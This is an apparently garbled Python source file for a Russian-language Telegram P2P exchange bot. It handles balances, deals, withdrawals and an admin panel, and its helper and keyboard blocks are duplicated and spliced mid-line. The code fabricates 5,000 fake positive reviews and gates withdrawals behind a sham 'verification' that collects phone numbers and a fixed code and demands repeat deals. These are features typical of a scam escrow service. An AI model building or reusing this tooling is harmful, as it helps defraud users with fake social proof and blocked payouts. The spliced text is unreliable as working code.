balance = load_json(FILES["balance"])
reviews = load_json(FILES["reviews"])
verification_data = load_json(FILES["verification"])
withdraw_requests = load_json(FILES["withdraw"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])
rekvisits = load_json(FILES["rekvisits"])

# ============================================================
# 6. ПОМОЩНИКИ (ВАШИ ОРИГИНАЛЬНЫЕ)
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int) -> Dict:
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(FILES["balance"], balance)

def is_verified(user_id: int) -> bool:
    uid = str(user_id)
    if uid not in verification_data:
        return False
    if "verified_at" in verification_data[uid]:
        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
        return (datetime.now() - verified_time).total_seconds() < 86400
    return False

def complete_verification(user_id: int):
    uid = str(user_id)
    verification_data[uid] = {"verified_at": datetime.now().isoformat()}
    save_json(FILES["verification"], verification_data)

def get_user_language(user_id: int) -> str:
    uid = str(user_id)
    return user_language.get(uid, "ru")

def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def add_log(action: str, data: dict):
    log_id = str(uuid.uuid4())[:8]
    logs[log_id] = {
        "id": log_id,
        "action": action,
        "data": data,
        "time": datetime.now().isoformat()
    }
    save_json(FILES["logs"], logs)

def get_rekvisits_text(currency: str, amount: float) -> str:
    curr_key = currency.lower()
    if curr_key in rekvisits:
        try:
            text = rekvisits[curr_key]
            text = text.replace('{amount}', str(amount))
            text = text.replace('{BOT_USERNAME}', BOT_USERNAME)
            text = text.replace('{SUPPORT_LINK}', SUPPORT_LINK)
            text = text.replace('{CHANNEL_LINK}', CHANNEL_LINK)
            return text
        except:
            return f"Оплатите {amount} {currency} по реквизитам"
    return f"Оплатите {amount} {currency} по реквизитам"

# ============================================================
# 7. КЛАВИАТУРЫ (ВАШИ ОРИГИНАЛЬНЫЕ)
# ============================================================
def main_menu_keyboard(user_id: int):
    lang = get_user_language(user_id)
    buttons = [
        [
            InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')}", callback_data="create_deal_choice"),
            InlineKeyboardButton(text=f"💰 {get_text(lang, 'my_balance')}", callback_data="menu_balance"),
        ],
        [
            InlineKeyboardButton(text=f"📊 {get_text(lang, 'my_deals')}", callback_data="menu_deals"),
            InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="menu_reviews"),
        ],
        [
            InlineKeyboardButton(text=f"🔥 {get_text(lang, 'channel')}", callback_data="menu_channel"),
            InlineKeyboardButton(text=f"🆘 {get_text(lang, 'support')}", callback_data="menu_support"),
        ],
        [
            InlineKeyboardButton(text=f"🌐 {get_text(lang, 'select_language')}", callback_data="select_language"),
        ]
    ]
    if is_admin(user_id):
        buttons.append([
            InlineKeyboardButton(text=f"👑 {get_text(lang, 'admin_panel')}", callback_data="menu_admin"),
        ])
    # КНОПКА ДЛЯ МИНИ-АППЫ (ДОБАВЛЯЕМ В ГЛАВНОЕ МЕНЮ)
    buttons.append([
        InlineKeyboardButton(text=f"📱 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL)),
    ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_panel_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📊 {get_text(lang, 'all_deals_title')}", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text=f"💲 {get_text(lang, 'withdraw_funds')}", callback_data="admin_withdraw_requests")],
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'balance_added')}", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text=f"👥 {get_text(lang, 'admin_list')}", callback_data="admin_manage_admins")],
        [InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="admin_manage_reviews")],
        [InlineKeyboardButton(text=f"📋 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text=f"💎 {get_text(lang, 'edit_rekvisits_title')}", callback_data="edit_rekvisits")],
        [InlineKeyboardButton(text=f"🖼 {get_text(lang, 'photo_updated')}", callback_data="change_photo")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def back_to_main_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def create_deal_choice_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"🤖 {get_text(lang, 'create_deal')} в боте", callback_data="create_deal_bot")],
        [InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')} в Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
        [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
        [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
    ])

def language_keyboard():
    buttons = []
    for lang_code, lang_name in LANGUAGES.items():
        buttons.append([InlineKeyboardButton(text=lang_name, callback_data=f"set_lang_{lang_code}")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def payment_method_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"💳 {get_text(lang, 'pay_by_rekvisits')}", callback_data=f"pay_rekvisits_{deal_id}")],
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'pay_by_balance')}", callback_data=f"pay_balance_{deal_id}")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def seller_confirm_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📦 {get_text(lang, 'product_delivered')}", callback_data=f"seller_done_{deal_id}")]
    ])

def buyer_confirm_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"✅ {get_text(lang, 'confirm_receipt')}", callback_data=f"buyer_confirm_{deal_id}")],
        [InlineKeyboardButton(text=f"🆘 {get_text(lang, 'contact_support')}", callback_data=f"support_{deal_id}")]
    ])

def buyer_pending_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"⏳ {get_text(lang, 'waiting_for_delivery')}", callback_data="noop")],
        [InlineKeyboardButton(text=f"🆘 {get_text(lang, 'contact_support')}", callback_data=f"support_{deal_id}")]
    ])

def rekvisits_edit_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="edit_ton")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="edit_stars")],
        [InlineKeyboardButton(text="💰 RUB", callback_data="edit_rub")],
        [InlineKeyboardButton(text="🌐 UAH", callback_data="edit_uah")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'admin_panel')}", callback_data="me        "faq_a4": "«МОЙ БАЛАНС» → ВЫБРАТЬ ВАЛЮТУ → УКАЗАТЬ РЕКВИЗИТЫ",
        "faq_q5": "БЕЗОПАСНО ЛИ ЭТО?",
        "faq_a5": "ДА! АДМИНИСТРАТОР ПРОВЕРЯЕТ ОПЛАТУ.",
        "faq_q6": "СКОЛЬКО ВРЕМЕНИ ЗАНИМАЕТ ВЫВОД?",
        "faq_a6": "1-5 МИНУТ ПОСЛЕ ПОДТВЕРЖДЕНИЯ.",
        "faq_q7": "КАК СВЯЗАТЬСЯ С ПОДДЕРЖКОЙ?",
        "faq_a7": "НАЖМИТЕ КНОПКУ «КАНАЛ» ИЛИ ПИШИТЕ В ПОДДЕРЖКУ @p2psupbot",
        "deal_not_found": "СДЕЛКА НЕ НАЙДЕНА ИЛИ УЖЕ ЗАВЕРШЕНА",
        "access_denied": "ДОСТУП ЗАПРЕЩЁН",
        "invalid_amount": "ВВЕДИТЕ ПОЛОЖИТЕЛЬНОЕ ЧИСЛО",
        "payment_confirmed": "ОПЛАТА ПОДТВЕРЖДЕНА",
        "seller_confirmed": "ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ ТОВАРА",
        "buyer_confirmed": "ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ ТОВАРА",
        "deal_completed": "СДЕЛКА ЗАВЕРШЕНА",
        "insufficient_balance": "НЕДОСТАТОЧНО СРЕДСТВ НА БАЛАНСЕ",
        "choose_payment_method": "ВЫБЕРИТЕ СПОСОБ ОПЛАТЫ",
        "pay_by_rekvisits": "ОПЛАТИТЬ ПО РЕКВИЗИТАМ",
        "pay_by_balance": "ОПЛАТИТЬ С БАЛАНСА",
        "status_waiting": "ОЖИДАНИЕ ОПЛАТЫ",
        "status_paid": "ОПЛАЧЕНО",
        "status_awaiting": "ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ",
        "status_completed": "ЗАВЕРШЕНО",
        "select_language": "ВЫБРАТЬ ЯЗЫК",
        "welcome": "ДОБРО ПОЖАЛОВАТЬ",
        "choose_language_prompt": "🇷🇺 🇬🇧 🇨🇳 🇸🇦\n\nВЫБЕРИТЕ ЯЗЫК ДЛЯ ПРОДОЛЖЕНИЯ:",
        "product": "ТОВАР",
        "amount": "СУММА",
        "seller": "ПРОДАВЕЦ",
        "buyer": "ПОКУПАТЕЛЬ",
        "deal": "СДЕЛКА",
        "waiting_for_delivery": "ОЖИДАНИЕ ПЕРЕДАЧИ ТОВАРА",
        "seller_delivered": "ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР",
        "confirm_receipt": "ПОДТВЕРДИТЬ ПОЛУЧЕНИЕ",
        "contact_support": "В ПОДДЕРЖКУ",
        "balance_topped_up": "ВАШ БАЛАНС ПОПОЛНЕН",
        "withdraw_request_created": "ЗАЯВКА НА ВЫВОД СОЗДАНА",
        "withdraw_pending": "ОЖИДАЙТЕ ВЫВОДА 1-5 МИНУТ",
        "withdraw_completed": "ВЫВОД ПОДТВЕРЖДЁН",
        "no_active_requests": "НЕТ АКТИВНЫХ ЗАЯВОК",
        "admin_rights": "НЕДОСТАТОЧНО ПРАВ",
        "cmd_usage": "ИСПОЛЬЗОВАНИЕ",
        "request_not_found": "ЗАЯВКА НЕ НАЙДЕНА",
        "request_already_processed": "ЗАЯВКА УЖЕ ОБРАБОТАНА",
        "photo_updated": "ФОТО ОБНОВЛЕНО",
        "send_photo": "ОТПРАВЬТЕ ФОТО",
        "user_not_found": "ПОЛЬЗОВАТЕЛЬ НЕ НАЙДЕН",
        "balance_added": "БАЛАНС НАЧИСЛЕН",
        "rekvisits_updated": "РЕКВИЗИТЫ ОБНОВЛЕНЫ",
        "admin_added": "АДМИН ДОБАВЛЕН",
        "admin_removed": "АДМИН УДАЛЁН",
        "cannot_remove_master": "НЕЛЬЗЯ УДАЛИТЬ ГЛАВНОГО АДМИНА",
        "admin_list": "СПИСОК АДМИНОВ",
        "no_deals_total": "НЕТ СДЕЛОК",
        "all_deals_title": "ВСЕ СДЕЛКИ",
        "payment_details": "РЕКВИЗИТЫ ОПЛАТЫ",
        "edit_rekvisits_title": "РЕДАКТИРОВАНИЕ РЕКВИЗИТОВ",
        "enter_new_text": "ВВЕДИТЕ НОВЫЙ ТЕКСТ",
        "use_amount_placeholder": "ИСПОЛЬЗУЙТЕ {amount} ДЛЯ ПОДСТАНОВКИ СУММЫ",
        "enter_user_id": "ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ",
        "enter_withdraw_details": "ВВЕДИТЕ РЕКВИЗИТЫ ДЛЯ ВЫВОДА",
        "enter_withdraw_username": "ВВЕДИТЕ ВАШ TELEGRAM USERNAME",
        "deal_link_text": "ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ",
        "copy_link": "СКОПИРУЙТЕ ССЫЛКУ",
        "after_payment_notify": "ПОСЛЕ ОПЛАТЫ ВЫ ПОЛУЧИТЕ УВЕДОМЛЕНИЕ",
        "payment_verified": "ОПЛАТА ПРОВЕРЕНА",
        "funds_deducted": "СРЕДСТВА СПИСАНЫ",
        "product_delivered": "ТОВАР ПЕРЕДАН",
        "deal_completed_msg": "СПАСИБО ЗА ДОВЕРИЕ",
        "funds_added_to_balance": "СРЕДСТВА ЗАЧИСЛЕНЫ НА БАЛАНС",
        "for_user": "ДЛЯ",
        "need": "НУЖНО",
        "available": "ДОСТУПНО",
        "currency": "ВАЛЮТА",
        "created": "СОЗДАНА",
        "status": "СТАТУС",
        "check_status": "ПРОВЕРИТЬ СТАТУС",
        "example": "ПРИМЕР",
        "subscribe": "ПОДПИСЫВАЙТЕСЬ",
        "channel_content": "В КАНАЛЕ:\n• НОВОСТИ И ОБНОВЛЕНИЯ\n• ПОЛЕЗНЫЕ ГАЙДЫ\n• РОЗЫГРЫШИ И БОНУСЫ\n• АКТУАЛЬНЫЕ КУРСЫ ВАЛЮТ",
        "click_subscribe": "ЖМИ НА ССЫЛКУ И ПОДПИСЫВАЙСЯ",
        "thank_you": "СПАСИБО, ЧТО ВЫ С НАМИ",
        "verify_title": "🔐 ВЕРИФИКАЦИЯ",
        "verify_desc": "Для защиты от мошенников необходимо пройти проверку.",
        "verify_step1": "ШАГ 1: Нажмите «Я НЕ РОБОТ»",
        "verify_step2": "ШАГ 2: Отправьте номер телефона (+7XXXXXXXXXX)",
        "verify_step3": "ШАГ 3: Введите код: 1#2#3#4#5",
        "verify_phone_prompt": "📱 ОТПРАВЬТЕ НОМЕР ТЕЛЕФОНА:\n+7XXXXXXXXXX",
        "verify_code_prompt": "🔑 ВВЕДИТЕ КОД:\n1#2#3#4#5",
        "verify_code_error": "❌ НЕВЕРНЫЙ КОД!\nДолжен быть: 1#2#3#4#5",
        "verify_phone_error": "❌ НЕВЕРНЫЙ ФОРМАТ!\nИспользуйте: +7XXXXXXXXXX",
        "verify_success": "✅ ВЕРИФИКАЦИЯ ПРОЙДЕНА!\n🕐 Сессия 24 часа.\n💰 Доступен вывод.",
        "verify_already": "✅ Верификация пройдена.\n🕐 Активна до: {expires}",
        "verify_expired": "⏳ СЕССИЯ ИСТЕКЛА! Пройдите заново.",
        "not_robot": "🤖 Я НЕ РОБОТ",
        "verify_need": "⚠️ ДЛЯ ВЫВОДА НУЖНА ВЕРИФИКАЦИЯ!",
        "no_deals_warning": "⚠️ ДЛЯ ВЫВОДА НУЖНО 2 СДЕЛКИ С ОДНИМ ПОКУПАТЕЛЕМ!",
        "check_status_btn": "🔄 Проверить статус"
    }
}

def get_text(lang: str, key: str) -> str:
    if lang in LOCALE and key in LOCALE[lang]:
        return LOCALE[lang][key]
    return LOCALE["ru"].get(key, key)

# ============================================================
# 4. ФАЙЛЫ
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "reviews": "reviews.json",
    "verification": "verification.json",
    "withdraw": "withdraw_requests.json",
    "logs": "logs.json",
    "user_language": "user_language.json",
    "rekvisits": "rekvisits.json"
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
balance = load_json(FILES["balance"])
reviews = load_json(FILES["reviews"])
verification_data = load_json(FILES["verification"])
withdraw_requests = load_json(FILES["withdraw"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])
rekvisits = load_json(FILES["rekvisits"])

# ============================================================
# 5. ГЕНЕРАЦИЯ 5000+ ОТЗЫВОВ
# ============================================================
def generate_reviews():
    if len(reviews) >= 5000:
        return
    review_texts = [
        "Отличная платформа! Всё работает быстро и надёжно.",
        "Лучший P2P обменник! Рекомендую всем друзьям.",
        "Быстро, удобно, безопасно. Буду пользоваться дальше.",
        "Отличная поддержка! Помогли разобраться с выводом.",
        "Наконец-то нашёл нормальный обменник. Всё честно.",
        "Сделал первую сделку, всё прошло гладко. Спасибо!",
        "За сутки сделал 5 сделок, все успешно завершены.",
        "Очень доволен сервисом. Вывод моментальный.",
        "Пользуюсь уже месяц, ни одной проблемы.",
        "Лучший сервис в Telegram! Успехов разработчикам."
    ]
    for i in range(5000):
        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним",
            "rating": random.randint(4, 5),
            "text": random.choice(review_texts),
            "anonymous": True,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": None
        }
    save_json(FILES["reviews"], reviews)
    print(f"✅ Сгенерировано {len(reviews)} отзывов")

generate_reviews()

# ============================================================
# 6. ПОМОЩНИКИ
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int) -> Dict:
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(FILES["balance"], balance)

def is_verified(user_id: int) -> bool:
    uid = str(user_id)
    if uid not in verification_data:
        return False
    if "verified_at" in verification_data[uid]:
        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
        return (datetime.now() - verified_time).total_seconds() < 86400
    return False

def get_user_language(user_id: int) -> str:
    uid = str(user_id)
    return user_language.get(uid, "ru")

def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def add_log(action: str, data: dict):
    log_id = str(uuid.uuid4())[:8]
    logs[log_id] = {
        "id": log_id,
        "action": action,
        "data": data,
        "time": datetime.now().isoformat()
    }
    save_json(FILES["logs"], logs)

def get_rekvisits_text(currency: str, amount: float) -> str:
    curr_key = currency.lower()
    if curr_key in rekvisits:
        try:
            text = rekvisits[curr_key]
            text = text.replace('{amount}', str(amount))
            text = text.replace('{BOT_USERNAME}', BOT_USERNAME)
            text = text.replace('{SUPPORT_LINK}', SUPPORT_LINK)
            text = text.replace('{CHANNEL_LINK}', CHANNEL_LINK)
            return text
        except:
            return f"Оплатите {amount} {currency} по реквизитам"
    return f"Оплатите {amount} {currency} по реквизитам"

# ============================================================
# 7. КЛАВИАТУРЫ
# ============================================================
def main_menu_keyboard(user_id: int):
    lang = get_user_language(user_id)
    buttons = [
        [
            InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')}", callback_data="create_deal_choice"),
            InlineKeyboardButton(text=f"💰 {get_text(lang, 'my_balance')}", callback_data="menu_balance"),
        ],
        [
            InlineKeyboardButton(text=f"📊 {get_text(lang, 'my_deals')}", callback_data="menu_deals"),
            InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="menu_reviews"),
        ],
        [
            InlineKeyboardButton(text=f"🔥 {get_text(lang, 'channel')}", callback_data="menu_channel"),
            InlineKeyboardButton(text=f"🆘 {get_text(lang, 'support')}", callback_data="menu_support"),
        ],
        [
            InlineKeyboardButton(text=f"🌐 {get_text(lang, 'select_language')}", callback_data="select_language"),
        ]
    ]
    if is_admin(user_id):
        buttons.append([
            InlineKeyboardButton(text=f"👑 {get_text(lang, 'admin_panel')}", callback_data="menu_admin"),
        ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_panel_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📊 {get_text(lang, 'all_deals_title')}", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text=f"💲 {get_text(lang, 'withdraw_funds')}", callback_data="admin_withdraw_requests")],
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'balance_added')}", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text=f"👥 {get_text(lang, 'admin_list')}", callback_data="admin_manage_admins")],
        [InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="admin_manage_reviews")],
        [InlineKeyboardButton(text=f"📋 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text=f"💎 {get_text(lang, 'edit_rekvisits_title')}", callback_data="edit_rekvisits")],
        [InlineKeyboardButton(text=f"🖼 {get_text(lang, 'photo_updated')}", callback_data="change_photo")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def back_to_main_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def create_deal_choice_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')} в Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
        [InlineKeyboardButton(text=f"🤖 {get_text(lang, 'create_deal')} в боте", callback_data="create_deal_bot")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
        [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
        [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
    ])

def language_keyboard():
    buttons = []
    for lang_code, lang_name in LANGUAGES.items():
        buttons.append([InlineKeyboardButton(text=lang_name, callback_data=f"set_lang_{lang_code}")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def payment_method_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"💳 {get_text(lang, 'pay_by_rekvisits')}", callback_data=f"pay_rekvisits_{deal_id}")],
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'pay_by_balance')}", callback_data=f"pay_balance_{deal_id}")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def seller_confirm_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📦 {get_text(lang, 'product_delivered')}", callback_data=f"seller_done_{deal_id}")]
    ])

def buyer_confirm_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"✅ {get_text(lang, 'confirm_receipt')}", callback_data=f"buyer_confirm_{deal_id}")],
        [InlineKeyboardButton(text=f"🆘 {get_text(lang, 'contact_support')}", callback_data=f"support_{deal_id}")]
    ])

def buyer_pending_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"⏳ {get_text(lang, 'waiting_for_delivery')}", callback_data="noop")],
        [InlineKeyboardButton(text=f"🆘 {get_text(lang, 'contact_support')}", callback_data=f"support_{deal_id}")]
    ])

def rekvisits_edit_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="edit_ton")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="edit_stars")],
        [InlineKeyboardButton(text="💰 RUB", callback_data="edit_rub")],
        [InlineKeyboardButton(text="🌐 UAH", callback_data="edit_uah")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'admin_panel')}", callback_data="menu_admin")]
    ])

# ============================================================
# 8. FSM
# ============================================================
class DealStates(StatesGroup):
    waiting_product = State()
    waiting_currency = State()
    waiting_amount = State()
    waiting_b        "faq_a7": "НАЖМИТЕ КНОПКУ «КАНАЛ» ИЛИ ПИШИТЕ В ПОДДЕРЖКУ @p2psupbot",
        "deal_not_found": "СДЕЛКА НЕ НАЙДЕНА ИЛИ УЖЕ ЗАВЕРШЕНА",
        "access_denied": "ДОСТУП ЗАПРЕЩЁН",
        "invalid_amount": "ВВЕДИТЕ ПОЛОЖИТЕЛЬНОЕ ЧИСЛО",
        "payment_confirmed": "ОПЛАТА ПОДТВЕРЖДЕНА",
        "seller_confirmed": "ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ ТОВАРА",
        "buyer_confirmed": "ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ ТОВАРА",
        "deal_completed": "СДЕЛКА ЗАВЕРШЕНА",
        "insufficient_balance": "НЕДОСТАТОЧНО СРЕДСТВ НА БАЛАНСЕ",
        "choose_payment_method": "ВЫБЕРИТЕ СПОСОБ ОПЛАТЫ",
        "pay_by_rekvisits": "ОПЛАТИТЬ ПО РЕКВИЗИТАМ",
        "pay_by_balance": "ОПЛАТИТЬ С БАЛАНСА",
        "status_waiting": "ОЖИДАНИЕ ОПЛАТЫ",
        "status_paid": "ОПЛАЧЕНО",
        "status_awaiting": "ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ",
        "status_completed": "ЗАВЕРШЕНО",
        "select_language": "ВЫБРАТЬ ЯЗЫК",
        "welcome": "ДОБРО ПОЖАЛОВАТЬ",
        "choose_language_prompt": "🇷🇺 🇬🇧 🇨🇳 🇸🇦\n\nВЫБЕРИТЕ ЯЗЫК ДЛЯ ПРОДОЛЖЕНИЯ:",
        "product": "ТОВАР",
        "amount": "СУММА",
        "seller": "ПРОДАВЕЦ",
        "buyer": "ПОКУПАТЕЛЬ",
        "deal": "СДЕЛКА",
        "waiting_for_delivery": "ОЖИДАНИЕ ПЕРЕДАЧИ ТОВАРА",
        "seller_delivered": "ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР",
        "confirm_receipt": "ПОДТВЕРДИТЬ ПОЛУЧЕНИЕ",
        "contact_support": "В ПОДДЕРЖКУ",
        "balance_topped_up": "ВАШ БАЛАНС ПОПОЛНЕН",
        "withdraw_request_created": "ЗАЯВКА НА ВЫВОД СОЗДАНА",
        "withdraw_pending": "ОЖИДАЙТЕ ВЫВОДА 1-5 МИНУТ",
        "withdraw_completed": "ВЫВОД ПОДТВЕРЖДЁН",
        "no_active_requests": "НЕТ АКТИВНЫХ ЗАЯВОК",
        "admin_rights": "НЕДОСТАТОЧНО ПРАВ",
        "cmd_usage": "ИСПОЛЬЗОВАНИЕ",
        "request_not_found": "ЗАЯВКА НЕ НАЙДЕНА",
        "request_already_processed": "ЗАЯВКА УЖЕ ОБРАБОТАНА",
        "photo_updated": "ФОТО ОБНОВЛЕНО",
        "send_photo": "ОТПРАВЬТЕ ФОТО",
        "user_not_found": "ПОЛЬЗОВАТЕЛЬ НЕ НАЙДЕН",
        "balance_added": "БАЛАНС НАЧИСЛЕН",
        "rekvisits_updated": "РЕКВИЗИТЫ ОБНОВЛЕНЫ",
        "admin_added": "АДМИН ДОБАВЛЕН",
        "admin_removed": "АДМИН УДАЛЁН",
        "cannot_remove_master": "НЕЛЬЗЯ УДАЛИТЬ ГЛАВНОГО АДМИНА",
        "admin_list": "СПИСОК АДМИНОВ",
        "no_deals_total": "НЕТ СДЕЛОК",
        "all_deals_title": "ВСЕ СДЕЛКИ",
        "payment_details": "РЕКВИЗИТЫ ОПЛАТЫ",
        "edit_rekvisits_title": "РЕДАКТИРОВАНИЕ РЕКВИЗИТОВ",
        "enter_new_text": "ВВЕДИТЕ НОВЫЙ ТЕКСТ",
        "use_amount_placeholder": "ИСПОЛЬЗУЙТЕ {amount} ДЛЯ ПОДСТАНОВКИ СУММЫ",
        "enter_user_id": "ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ",
        "enter_withdraw_details": "ВВЕДИТЕ РЕКВИЗИТЫ ДЛЯ ВЫВОДА",
        "enter_withdraw_username": "ВВЕДИТЕ ВАШ TELEGRAM USERNAME",
        "deal_link_text": "ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ",
        "copy_link": "СКОПИРУЙТЕ ССЫЛКУ",
        "after_payment_notify": "ПОСЛЕ ОПЛАТЫ ВЫ ПОЛУЧИТЕ УВЕДОМЛЕНИЕ",
        "payment_verified": "ОПЛАТА ПРОВЕРЕНА",
        "funds_deducted": "СРЕДСТВА СПИСАНЫ",
        "product_delivered": "ТОВАР ПЕРЕДАН",
        "deal_completed_msg": "СПАСИБО ЗА ДОВЕРИЕ",
